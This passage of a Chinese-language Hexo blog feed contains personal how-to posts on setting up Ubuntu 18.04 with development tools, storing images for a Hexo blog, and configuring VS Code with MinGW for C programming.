Coderepository通过键入:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main"</span></span><br></pre></td></tr></table></figure></li><li><p>安装最新版本的Visual Studio代码:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sudo</span> <span class="string">apt update</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">apt install code</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>使用</strong></p><p>终端输入<code>code</code>,或者单击vscode图标</p><p><strong>插件推荐</strong></p><ol><li>Chinese (Simplified) Language Pack for Visual Studio Code 就问你中文香不香</li><li>C/C++ </li><li>Python</li><li>Code Runner 可以跑好多种代码,好评</li></ol><p><strong>配置c</strong></p><ol><li><p>安装vscode插件———-&gt;c/c++</p></li><li><p>创建一个c文件,输入一些代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include&lt;stdio.h&gt;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>终端输入<code>sudo apt install gcc</code></p></li><li><p>在菜单栏里面选择Terminal–&gt;Configure Tasks–&gt;gcc，会自动帮你生成<code>.vscode</code>目录和一个<code>launch.json</code>文件</p></li><li><p>打开c文件按F5,会报错,顺着点就会自动生成第二个文件<code>tasks.json</code></p></li><li><p>再次按F5就成功编译了</p></li></ol><ul><li>我看网上很多对于配置文件有所改动,但是就算博主可以用,也是针对他自己的电脑可以用</li><li>直接复制粘贴,对路径啊什么的略作修改啊,成功率挺低的</li><li>所以我想看看直接默认配置会怎么样,毕竟软件做出来是给人用的,搞这么麻烦,不人道啊</li><li>……可以用了: )</li><li>比起win10,ubuntu意外的好用呢&gt;&lt;</li></ul><p><strong>配置py</strong></p><ol><li>安装python插件</li><li>新建test.py文件,会弹出</li></ol><p><img src="Snipaste_2020-04-01_09-32-47.png" alt="Snipaste_2020-04-01_09-32-47"></p><ol start="3"><li><p>直接点击安装，由于缺少pip环境会导致安装失败。</p></li><li><p>于是先安装pip：sudo apt-get install python-pip</p></li><li><p>然后直接安装即可：pip install pylint</p></li></ol><h2 id="sublime-text3"><a href="#sublime-text3" class="headerlink" title="sublime text3"></a>sublime text3</h2><ol><li><p>运行命令添加密钥环：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - http<span class="variable">s:</span>//download.sublimetext.<span class="keyword">com</span>/sublimehq-pub.gpg | sudo apt-key <span class="built_in">add</span> -</span><br></pre></td></tr></table></figure></li><li><p>添加apt存储库:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"deb https://download.sublimetext.com/ apt/stable/"</span> | sudo tee /etc/apt/sources.<span class="built_in">list</span>.d/sublime-<span class="built_in">text</span>.<span class="built_in">list</span></span><br></pre></td></tr></table></figure></li><li><p>通过Synaptic包管理器或运行命令安装sublime-text包：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">update</span> &amp;&amp; sudo apt <span class="keyword">install</span> sublime-<span class="built_in">text</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="java-jdk-8"><a href="#java-jdk-8" class="headerlink" title="java jdk-8"></a>java jdk-8</h2><p>更新软件包列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>2、安装openjdk-8-jdk：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure><p>3、查看java版本，看看是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><h2 id="调整终端字体大小"><a href="#调整终端字体大小" class="headerlink" title="调整终端字体大小"></a>调整终端字体大小</h2><p>默认的实在太小了,眼都快瞎了&gt;&lt;</p><ol><li><p>终端右键<code>Preferences</code></p></li><li><p>按图搞一波~~</p><p><img src="Snipaste_2020-04-02_09-37-01.png" alt="Snipaste_2020-04-02_09-37-01"></p></li></ol><h2 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h2><p>本来对pycharm无感的来着,在成功申请jetbrains的学生优惠后……</p><p>真香</p><p>jetbrain的操作都差不多,webstore的安装,修改,加速都和pycharm一样</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li><p>下载linux版本的jetbrains toolbox: <a href="https://www.jetbrains.com/toolbox-app/" target="_blank" rel="noopener">https://www.jetbrains.com/toolbox-app/</a></p></li><li><p>拖到虚拟机,提取,点击即可使用</p></li><li><p>十分方便下载,如图</p><p><img src="Snipaste_2020-04-02_09-42-08.png" alt="Snipaste_2020-04-02_09-42-08"></p></li></ol><h3 id="修改字体大小"><a href="#修改字体大小" class="headerlink" title="修改字体大小"></a>修改字体大小</h3><ul><li><p>file—&gt;setting</p></li><li><p>如图修改菜单栏字体大小</p><p><img src="Snipaste_2020-04-02_10-40-17.png" alt="Snipaste_2020-04-02_10-40-17"></p></li><li><p>如图修改代码字体大小</p><p><img src="Snipaste_2020-04-02_10-42-32.png" alt="Snipaste_2020-04-02_10-42-32"></p></li></ul><h3 id="jupyter-notebook"><a href="#jupyter-notebook" class="headerlink" title="jupyter notebook"></a>jupyter notebook</h3><p><strong>安装</strong></p><p>一开始是从anaconda开始的,所以对jupyter有特殊的情感呢</p><p>所以听说pycharm支持了,就搞起来试试</p><ol><li><p>终端:<code>pip install jupyter</code></p><p>==我看博客上都是直接pip的,但是安装后发现里面只有python2,所以”pip3 install jupyter”试试,ojbk==</p></li><li><p>下载的过程中报了好几次错(记录一下报错及处理方法)</p><ul><li>timeout: 继续下,不要管,反正好像是接着下的(我怀疑是网的原因)</li><li>setuptool: <code>pip install setuptools==33.1.1</code></li></ul></li></ol><p><strong>使用</strong></p><ol><li><p>如果不是pycharm用的话,直接终端输入<code>jupyter notebook</code>就可以在浏览器中开一个了,直接用就行</p><p>还是原来的配方,还是原来的味道</p></li><li><p>pycharm有两种使用方式</p><p>==不知道有没有编程浏览器那种的排版方式,左右的真的不习惯啊==</p><ul><li><p>new一个file,选择jupyter类型,第一次使用,会提示你下载插件,下载完就行了</p><p><img src="Snipaste_2020-04-02_10-01-58.png" alt="Snipaste_2020-04-02_10-01-58"></p></li><li><p>在终端中使用</p><p><img src="Snipaste_2020-04-02_10-02-16.png" alt="Snipaste_2020-04-02_10-02-16"></p></li></ul></li></ol><h3 id="加速"><a href="#加速" class="headerlink" title="加速"></a>加速</h3><p>pycharm打开有点慢,而且经常卡死,所以要修改一下配置</p><p>调整一下堆的大小,如图操作</p><ol><li>help–&gt;find action</li></ol><p><img src="Snipaste_2020-04-02_10-17-28.png" alt="Snipaste_2020-04-02_10-17-28"></p><ol start="2"><li>搜索vm options…</li></ol><p><img src="Snipaste_2020-04-02_10-18-13.png" alt="Snipaste_2020-04-02_10-18-13"></p><ol start="3"><li>修改</li></ol><p><img src="Snipaste_2020-04-02_10-20-28.png" alt="Snipaste_2020-04-02_10-20-28"></p><ol start="4"><li>使用体验: 确实快了很多</li></ol><h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><p>搞了半天,一看时间,嗯,还早</p><p>退出来一看……wtf!!!</p><p>啊,同步时间,迫在眉睫</p><ol><li><p>查看时区(我的已经改过来了,原来是utc)</p><ul><li>UTC:协调世界时</li><li>CST:北京时间</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">date</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="Snipaste_2020-04-02_13-01-43.png" alt="Snipaste_2020-04-02_13-01-43"></p><ol start="2"><li>查看是否同步</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo timedatectl</span></span><br></pre></td></tr></table></figure><p><img src="Snipaste_2020-04-02_13-05-13.png" alt="Snipaste_2020-04-02_13-05-13"></p><ul><li><p>如果是no</p><p>重启服务(看看yes了没)</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="keyword"> system</span>ctl restart<span class="keyword"> system</span>d-timesyncd.service</span><br></pre></td></tr></table></figure><p>启动服务(再康康yes了没)</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sudo </span><span class="string">timedatectl </span><span class="built_in">set-ntp</span> <span class="string">true</span></span><br></pre></td></tr></table></figure><p>还不行?那我也木的办法了</p></li></ul><ol start="3"><li><p>更改时区</p><ul><li><p>列出可用时区(按q退出)</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl <span class="built_in">list</span>-timezones</span><br></pre></td></tr></table></figure></li></ul></li></ol><pre><code>![Snipaste_2020-04-02_13-10-19](Snipaste_2020-04-02_13-10-19.png)</code></pre><ul><li><p>设置新时区(以上海为例)</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sudo </span><span class="string">timedatectl </span><span class="built_in">set-timezone</span> <span class="string">Asia/</span><span class="string">Shanghai</span></span><br></pre></td></tr></table></figure></li></ul><ol start="4"><li><p>要是想换回原来的时区</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sudo </span><span class="string">timedatectl </span><span class="built_in">set-timezone</span> <span class="string">UTC</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="搭服务器"><a href="#搭服务器" class="headerlink" title="搭服务器"></a>搭服务器</h2><p>先下一堆东西</p><ol><li><p>ssh</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install ssh</span><br></pre></td></tr></table></figure></li><li><p>apache</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install apache2</span><br></pre></td></tr></table></figure><p>apache默认网站的文件根目录在/var/www下面，html文件夹下面有个index.html里面记录的信息就是我们当时访问localhost，浏览器所显示的东西</p><ul><li><p>sudo systemctl start apache2 //启动</p></li><li><p>sudo systemctl stop apache2 //停止</p></li><li><p>sudo systemctl restart apache2 //重启</p></li><li><p>sudo systemctl reload apache2 //在不重新启动连接的情况下应用配置更改。</p></li><li><p>sudo systemctl disable apache2 //禁止开机自启</p></li></ul></li><li><p>mysql</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install mysql-<span class="keyword">server</span></span><br></pre></td></tr></table></figure></li><li><p>mysql-client</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install mysql-client</span><br></pre></td></tr></table></figure></li><li><p>php</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install php</span><br></pre></td></tr></table></figure></li><li><p>php&amp;apache的连接件</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install libapache2-<span class="keyword">mod</span>-php</span><br></pre></td></tr></table></figure></li><li><p>phpmyadmin</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install phpmyadmin</span><br></pre></td></tr></table></figure></li></ol><h2 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h2><ol><li>在应用中找到<code>language supporting</code></li></ol><p><img src="Snipaste_2020-04-03_11-09-13.png" alt="Snipaste_2020-04-03_11-09-13"></p><ol start="2"><li><code>install/remove language</code>–&gt;<code>chines(simplifled)</code>–&gt;<code>apply</code></li></ol><p><img src="Snipaste_2020-04-03_11-10-12.png" alt="Snipaste_2020-04-03_11-10-12"></p><ol start="3"><li><p>下载过程中会让你输入密码</p></li><li><p>手动把中国汉字拉到第一个,apply</p><p><img src="Snipaste_2020-04-03_11-17-26.png" alt="Snipaste_2020-04-03_11-17-26"></p></li><li><p>重启</p></li><li><p>ojbk</p></li></ol><h2 id="美化"><a href="#美化" class="headerlink" title="美化"></a>美化</h2><ol><li><p><code>sudo apt-get install gnome-tweak-tool</code></p></li><li><p><code>sudo apt-get install  gnome-shell-extension-dashtodock</code></p><p>扩展,用于配置任务栏(我想把放到下面并居中)</p></li><li><p>重启</p></li><li><p><code>gnome-tweaks</code>,或从应用中打开,中文名为优化</p><p><img src="Snipaste_2020-04-03_11-44-19.png" alt="Snipaste_2020-04-03_11-44-19"></p></li><li><p>根据自己的喜好进行配置</p></li></ol><p>附我的配置</p><ol><li><p>主题(其实这个外观已经时应用后的样子了)</p><p><img src="Snipaste_2020-04-03_11-45-40.png" alt="Snipaste_2020-04-03_11-45-40"></p></li><li><p>任务栏</p><p><img src="Snipaste_2020-04-03_11-47-58.png" alt="Snipaste_2020-04-03_11-47-58"></p><p>配置</p><p><img src="Snipaste_2020-04-03_11-50-04.png" alt="Snipaste_2020-04-03_11-50-04"></p><p>结果</p><p><img src="Snipaste_2020-04-03_11-51-51.png" alt="Snipaste_2020-04-03_11-51-51"></p></li></ol><h2 id="腾点空间"><a href="#腾点空间" class="headerlink" title="腾点空间"></a>腾点空间</h2><p>为啥突然想不开,搞清理呢?</p><p>我的破电脑空间不够用了,大清理了一番</p><p>居安思危,觉得虚拟机也得清理  <del>(什么歪理啊,tui)</del></p><h3 id="清理垃圾"><a href="#清理垃圾" class="headerlink" title="清理垃圾"></a>清理垃圾</h3><p>Ubuntu系统在运行时是不会产生无用垃圾的。但是我们在升级系统时，软件管理器下载的软件包，系统则不会自动删除，其实这样做也是考虑到你可能会再次安装从而加快再次安装的速度考虑。</p><p>删除已卸载掉软件包</p><p><code>sudo apt-get autoclean</code></p><p>删除所有安装包</p><p><code>sudo apt-get clean</code></p><p>删除孤立包(某些软件的依赖项,但别的软件用不上)</p><p><code>sudo apt-get autoremove</code></p><h3 id="删除老旧内核"><a href="#删除老旧内核" class="headerlink" title="删除老旧内核"></a>删除老旧内核</h3><ol><li><p>查看内核版本,免得误删</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname -r</span></span><br></pre></td></tr></table></figure><p><img src="image-20200404123816670.png" alt="image-20200404123816670"></p></li><li><p>显示文件</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">dpkg</span> --<span class="meta">get</span>-<span class="keyword">selections </span><span class="title">| grep linux</span></span><br></pre></td></tr></table></figure><p>已经删完了,就补张图好了&gt;&lt;</p><p><img src="image-20200404124053791.png" alt="image-20200404124053791"></p></li><li><p>删掉低版本的内核文件image、头文件headers</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> purge  内核文件名  头文件名</span><br></pre></td></tr></table></figure></li></ol><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><ol><li><p>下载(我下的时候已经默认存在了)</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> git</span><br></pre></td></tr></table></figure></li><li><p>查看版本</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="comment">--version</span></span><br></pre></td></tr></table></figure></li><li><p>配置名称和邮箱</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"123"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"123@123.net"</span></span><br></pre></td></tr></table></figure><p>可通过查看.gitconfig来验证配置更改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--list</span><br></pre></td></tr></table></figure><p>如果用了 <strong>–global</strong> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。</p><p>如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 –global 选项重新配置即可，新的设定保存在当前项目的 .git/config 文件里。</p></li></ol><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>N: 无法安全地用该源进行更新，所以默认禁用该源。</p><p><img src="Snipaste_2020-04-04_13-01-51.png" alt="Snipaste_2020-04-04_13-01-51"></p><p>打开<strong>软件与更新</strong></p><p><img src="Snipaste_2020-04-04_13-02-13.png" alt="Snipaste_2020-04-04_13-02-13"></p><p><strong>其他软件</strong>–&gt;把勾去掉</p><p><img src="Snipaste_2020-04-04_13-03-15.png" alt="Snipaste_2020-04-04_13-03-15"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p>奇奇怪怪: <a href="https://zhuanlan.zhihu.com/p/56253982" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/56253982</a></p><p>sogou: <a href="https://blog.csdn.net/lupengCSDN/article/details/80279177" target="_blank" rel="noopener">https://blog.csdn.net/lupengCSDN/article/details/80279177</a></p><p>vscode</p><blockquote><p>vscode安装: <a href="https://linuxize.com/post/how-to-install-visual-studio-code-on-ubuntu-18-04/" target="_blank" rel="noopener">https://linuxize.com/post/how-to-install-visual-studio-code-on-ubuntu-18-04/</a></p><p>配置py: <a href="https://blog.csdn.net/yk150915/article/details/81087282" target="_blank" rel="noopener">https://blog.csdn.net/yk150915/article/details/81087282</a></p><p>配置c: <a href="https://segmentfault.com/a/1190000020155987" target="_blank" rel="noopener">https://segmentfault.com/a/1190000020155987</a></p></blockquote><p>sublime text3: <a href="https://www.linuxidc.com/Linux/2019-03/157533.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2019-03/157533.htm</a></p><p>jdk-8: <a href="https://blog.csdn.net/zbj18314469395/article/details/86064849" target="_blank" rel="noopener">https://blog.csdn.net/zbj18314469395/article/details/86064849</a></p><p>pycharm</p><blockquote><p>jupyter安装失败: <a href="https://blog.csdn.net/jiangzubing520/article/details/80253792?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/jiangzubing520/article/details/80253792?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p><p>pycharm中jupyter使用方法: <a href="https://blog.csdn.net/xiemanR/article/details/71837385" target="_blank" rel="noopener">https://blog.csdn.net/xiemanR/article/details/71837385</a></p><p>pycharm加速: <a href="https://blog.csdn.net/jack339083590/article/details/79261717?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/jack339083590/article/details/79261717?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p></blockquote><p>时间同步: <a href="https://linux.cn/article-11220-1.html" target="_blank" rel="noopener">https://linux.cn/article-11220-1.html</a></p><p>中文: <a href="https://m.jb51.net/os/Ubuntu/298601.html" target="_blank" rel="noopener">https://m.jb51.net/os/Ubuntu/298601.html</a></p><p>美化: <a href="https://blog.csdn.net/weixin_43629813/article/details/100525856" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43629813/article/details/100525856</a></p><p>清理: <a href="https://blog.csdn.net/levon2018/article/details/81746613?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">https://blog.csdn.net/levon2018/article/details/81746613?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1</a></p><p>git: <a href="https://www.linuxidc.com/Linux/2018-05/152610.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2018-05/152610.htm</a></p><p>问题: <a href="https://blog.csdn.net/weixin_42966187/article/details/89380505" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42966187/article/details/89380505</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从零开始ubuntu-18-04&quot;&gt;&lt;a href=&quot;#从零开始ubuntu-18-04&quot; class=&quot;headerlink&quot; title=&quot;从零开始ubuntu 18.04&quot;&gt;&lt;/a&gt;从零开始ubuntu 18.04&lt;/h1&gt;&lt;hr&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;
      
    
    </summary>
    
    
      <category term="虚拟机" scheme="https://mercer5.github.io/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
      <category term="虚拟机" scheme="https://mercer5.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
      <category term="linux" scheme="https://mercer5.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>blod插入图片</title>
    <link href="https://mercer5.github.io/2020/04/04/blod%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/"/>
    <id>https://mercer5.github.io/2020/04/04/blod%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</id>
    <published>2020-04-04T07:16:53.000Z</published>
    <updated>2020-08-24T15:30:09.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="blog插入图片"><a href="#blog插入图片" class="headerlink" title="blog插入图片"></a>blog插入图片</h1><h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>由于微博图床没了,博主只能苦逼的找方法解决博客上所有图片显示失败问题了.</p><p>目前有三种方法</p><ul><li>用dl的方法(百度你值得拥有)继续使用,但还是算了<ol><li>太麻烦了,每个图片都要改</li><li>免费的图床风险还是太大,说没就没</li></ol></li><li>买服务器,这条路也不准备走<del>问就是没钱</del></li><li>所以只能把图片保存在本地了: )</li></ul><h2 id="搞起来"><a href="#搞起来" class="headerlink" title="搞起来"></a>搞起来</h2><h3 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h3><p>可以将图片统一放在<code>source/images</code>文件夹中，通过markdown语法访问它们。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">source</span><span class="regexp">/images/im</span>age.jpg![](<span class="regexp">/images/im</span>age.jpg)</span><br></pre></td></tr></table></figure><h3 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h3><p>放在文章自己的目录中。文章的目录可以通过配置<code>_config.yml</code>来生成。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">_config</span>.</span></span>ymlpost_asset_folder: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>将<code>_config.yml</code>文件中的配置项<code>post_asset_folder</code>设为<code>true</code>后，执行命令<code>$ hexo new post_name</code>，在<code>source/_posts</code>中会生成文章<code>post_name.md</code>和同名文件夹<code>post_name</code>。将图片资源放在<code>post_name</code>中，文章就可以使用相对路径引用图片资源了。</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">_posts</span>/post_name/<span class="built_in">image</span>.jpg![](<span class="built_in">image</span>.jpg)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;blog插入图片&quot;&gt;&lt;a href=&quot;#blog插入图片&quot; class=&quot;headerlink&quot; title=&quot;blog插入图片&quot;&gt;&lt;/a&gt;blog插入图片&lt;/h1&gt;&lt;h2 id=&quot;现状&quot;&gt;&lt;a href=&quot;#现状&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>vscode配置c</title>
    <link href="https://mercer5.github.io/2020/03/02/vscode%E9%85%8D%E7%BD%AEc/"/>
    <id>https://mercer5.github.io/2020/03/02/vscode%E9%85%8D%E7%BD%AEc/</id>
    <published>2020-03-02T05:43:52.000Z</published>
    <updated>2020-08-24T15:30:09.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vscode配置c"><a href="#vscode配置c" class="headerlink" title="vscode配置c"></a>vscode配置c</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过网上dl的教程我成功配置好c啦! 链接在这里<a href="https://hovenjay.github.io/2018/06/01/VSCodeC/" target="_blank" rel="noopener">https://hovenjay.github.io/2018/06/01/VSCodeC/</a></p><p>不过配置的过程还是很艰辛的,也有一些弯路,所以记录一下</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>Visual Studio Code:<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">https://code.visualstudio.com/</a></p><p>MinGw-w64:<a href="https://sourceforge.net/projects/mingw-w64/" target="_blank" rel="noopener">https://sourceforge.net/projects/mingw-w64/</a> </p><h2 id="1-MinGW"><a href="#1-MinGW" class="headerlink" title="1. MinGW"></a>1. MinGW</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>MinGW 是一组包含文件和端口库，其功能是允许控制台模式的程序使用微软的标准C运行时（C Runtime）库</p><p>如果已经下载了devcpp还有其他什么编译器的可以不用下,在文件夹里找一下,会有的</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先下载 MinGW-w64 。下载完成之后我们开始安装 MinGw-w64，安装路径可以自由定义(自己找得到就行)</p><p>安装时需要设置的安装选项如下：</p><ul><li>Version ：GCC 版本，直接选最高；</li><li>Architecture ：CPU 架构，系统如果为64位，则选择 x86_64；</li><li>Threads ：API 模式，使用默认选项；</li><li>Exception ：异常处理方式，seh 仅针对 64 位架构，sjlj 则兼容 32 位架构；</li><li>Build revision ：修订版本，使用默认选项；</li></ul><p><img src="2018-06-01_12-44-09.png" alt="2018-06-01_12-44-09"></p><h3 id="加入环境"><a href="#加入环境" class="headerlink" title="加入环境"></a>加入环境</h3><p>在安装路径中找到 bin 文件夹，通常在 <code>${MinGW-w64安装位置}\mingw64\bin</code> </p><p>接下来，我们将刚刚获取的 bin 文件夹的路径添加到系统环境变量。</p><ul><li><p>win10的话,点击设置</p></li><li><p>搜索环境</p><p><img src="Snipaste_2020-03-02_12-44-11.png" alt="Snipaste_2020-03-02_12-44-11"></p></li><li><p>编辑系统环境path</p><p><img src="image-20200302124619131.png" alt="image-20200302124619131"></p></li><li><p>加入 bin 文件夹的路径</p><p><img src="image-20200302124736792.png" alt="image-20200302124736792"></p></li><li><p>检测环境变量是否配置正确</p><p>在命令行输入 gcc –version，如果返回的是已安装的 gcc 的版本信息，那么环境变量就配置正确了。</p></li></ul><h2 id="2-vscode插件"><a href="#2-vscode插件" class="headerlink" title="2. vscode插件"></a>2. vscode插件</h2><ol><li>c/c++</li><li>code runner</li><li>chinese <del>&gt;&lt;这个选下吼,不得不说太和我的心意了</del></li></ol><p>在下图所示位置搜索下载</p><p><img src="image-20200302125123334.png" alt="image-20200302125123334"></p><h2 id="3-创建和设置c语言工作开发区"><a href="#3-创建和设置c语言工作开发区" class="headerlink" title="3. 创建和设置c语言工作开发区"></a>3. 创建和设置c语言工作开发区</h2><p>在你的计算机中选择一个合适的位置，作为你的 C 语言开发工作区。建议工作区所在路径仅由字母、数字、下划线组成，不要包含其他的符号。</p><p>使用vscode打开你创建的工作区</p><p>在工作区新建一个 C 语言源文件命名为 hello.c ，输入以下内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello 